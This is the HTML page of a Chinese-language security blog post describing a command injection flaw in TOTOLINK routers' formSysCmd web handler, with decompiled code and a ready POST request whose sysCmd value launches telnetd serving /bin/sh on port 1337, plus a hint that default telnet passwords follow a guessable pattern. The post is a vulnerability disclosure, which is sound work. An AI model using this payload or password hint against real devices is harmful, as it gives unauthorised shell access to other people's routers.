@@ -1,0 +1,309 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020"/>
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" integrity="sha512-ygEyjMC6rqnzJqWGjRTJUPYMEs9JUOm3i7OWUS9CgQ4XkBUvMsgCS1I8JqavidQ2ClHcREB7IbA2mN08+r9Elg==" crossorigin="anonymous" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js" integrity="sha512-9DNXrSjk17bU9MUbRp3IjwcWe46V8FaGA062PFbryPUAEQVRbz4jiZP6FW0AdbqEGtMYBDWnul3eiGBMJOQajA==" crossorigin="anonymous"></script>
+  
+  
+    <meta name="keywords" content="TOTOLINK,IOT,RCE," />
+  
+
+  
+    <meta name="description" content="TOTOLINK RCE" />
+  
+  
+  <link rel="icon" type="image/x-icon" href="/images/logo.png">
+  <title>TOTOLINK RCE [ 4uuu Nya&#39;s HomePage ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    <img class="avatar" src="https://qvq.im/images/logo.png">
+    <span class="title">4uuu Nya&#39;s HomePage</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            <li class="pure-menu-item"><a href="/" class="pure-menu-link">Home</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">Archives</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/tags" class="pure-menu-link">Tags</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/friends" class="pure-menu-link">Friends</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/about" class="pure-menu-link">About</a></li>
+          
+      
+  </ul>
+   
+</nav>
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        TOTOLINK RCE
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2020-01-31T22:06:05.000Z">
+        2020-01-31
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IOT/" rel="tag">IOT</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/TOTOLINK/" rel="tag">TOTOLINK</a></li></ul>
+      </span>
+    </span>
+      <span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>
+    </header>
+
+    <div class="post-content">
+      <p>搞完了搜一下发现居然好久以前就有人提了 Orz 这么久都没修，干脆发出来好了，顺便好久没写博客了，更新一发</p>
+<p>由于家里路由器还在用，不能拿来接TTL，所以上官网找了个其他版本的固件，对比了一下已知的页面发现是通用的</p>
+<p>下载下来的固件web目录里有个syscmd.htm，但是在页面中看不到功能的接口，但是模拟跑起来的固件页面中是存在的</p>
+<p><img src="/images/%E6%88%AA%E5%B1%8F2020-01-3122.16.48.png"></p>
+<p>查看页面发现请求的地址是 <code>/boafrm/formSysCmd</code></p>
+<p>后端代码在 /bin/boa 文件中, 找到formSysCmd对应的函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004821c4 10 f7 45 00     addr       s_formSysCmd_0045f710                            &#x3D; &quot;formSysCmd&quot;</span><br><span class="line">004821c8 ac 62 44 00     addr       FUN_004462ac</span><br></pre></td></tr></table></figure>
+<p>跟进去</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FUN_004462ac</span><span class="params">(undefined4 param_1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  undefined4 uVar1;</span><br><span class="line">  <span class="keyword">char</span> *pcVar2;</span><br><span class="line">  <span class="keyword">int</span> local_88;</span><br><span class="line">  <span class="keyword">char</span> acStack132 [<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">char</span> *local_20;</span><br><span class="line">  </span><br><span class="line">  local_88 = <span class="number">0</span>;</span><br><span class="line">  uVar1 = FUN_0040fbac(param_1,<span class="string">&quot;submit-url&quot;</span>,<span class="number">0x46fbe0</span>);</span><br><span class="line">  local_20 = (<span class="keyword">char</span> *)FUN_0040fbac(param_1,<span class="string">&quot;sysCmd&quot;</span>,<span class="number">0x46fbe0</span>);</span><br><span class="line">  pcVar2 = (<span class="keyword">char</span> *)FUN_0040fbac(param_1,<span class="string">&quot;sysCmdselect&quot;</span>,<span class="number">0x46fbe0</span>);</span><br><span class="line">  local_88 = (<span class="keyword">int</span>)*pcVar2 + <span class="number">-0x30</span>;</span><br><span class="line">  apmib_set(<span class="number">0x4e70</span>,&amp;local_88);</span><br><span class="line">  <span class="keyword">if</span> (*local_20 != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(acStack132,<span class="number">100</span>,<span class="string">&quot;%s 2&gt;&amp;1 &gt; %s  &amp;&quot;</span>,local_20,<span class="string">&quot;/tmp/syscmd.log”);</span></span><br><span class="line"><span class="string">    unlink(&quot;</span>/tmp/syscmd.<span class="built_in">log</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string">    system(acStack132);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  system(&quot;</span>sleep <span class="number">5</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string">  FUN_0040c20c(param_1,uVar1);</span></span><br><span class="line"><span class="string">  return;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>其中 <code>submit-url</code>, <code>sysCmd</code>, <code>sysCmdselect</code> 为提交的三个参数，这里不一样的是我家里路由器提交的参数是没有 <code>sysCmdselect</code> 的，页面长这样</p>
+<p><img src="/images/%E6%88%AA%E5%B1%8F2020-01-3122.20.30.png"></p>
+<p>提交的参数变化就是 <code>sysCmdselect</code> 变成了 <code>apply</code>，<code>sysCmd</code> 就是提交的命令，直接format一下拼接个命令就带进去执行了</p>
+<p>直接post一下就可以了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;boafrm&#x2F;formSysCmd</span><br><span class="line"></span><br><span class="line">sysCmd&#x3D;telnetd -l &#x2F;bin&#x2F;sh -p 1337&amp;apply&#x3D;Apply&amp;submit-url&#x3D;%2Fsyscmd.htm</span><br></pre></td></tr></table></figure>
+<p><img src="/images/QQ20200131-222801@2x.jpg"></p>
+<hr>
+<p>PS: 另外我发现家里路由器默认开了telnet, 而且密码后面找到后发现不像是个随机密码，没测其他设备，感兴趣的阔以瞅瞅自己totolink默认开telnet后的密码是不是c开头，四位数</p>
+
+    </div>
+  </article>
+  <div class="toc-container">
+    
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+<div class="share" style="width: 100%;">
+  <div style="margin: auto; text-align: center; font-size: 0.8em; color: grey;">
+    <div class="social-share" data-initialized="true">
+      <a href="#" class="social-share-icon icon-weibo"></a>
+      <a href="#" class="social-share-icon icon-qq"></a>
+      <a href="#" class="social-share-icon icon-wechat"></a>
+      <a href="#" class="social-share-icon icon-qzone"></a>
+    </div>
+  </div>
+</div>
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2019/04/17/%E7%88%AC%E4%B8%80%E4%B8%8B%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83/" rel="next" title="爬一下知识星球">
+          爬一下知识星球
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2020/02/18/CVE-2020-0618/" rel="prev" title="CVE-2020-0618 writeup">
+            CVE-2020-0618 writeup
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <a class="bottom-item" href="https://qvq.im">Index</a> |
+        <a class="bottom-item" href="https://github.com/sco4x0" target="_blank">GitHub</a> |
+        <a class="bottom-item" href="https://hexo.io" target="_blank">Powered by hexo</a> |
+        <a class="bottom-item" href="https://github.com/KevinOfNeu/hexo-theme-xoxo" target="_blank">Theme xoxo</a>
+    </div>
+</footer>
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+</body>
+</html>
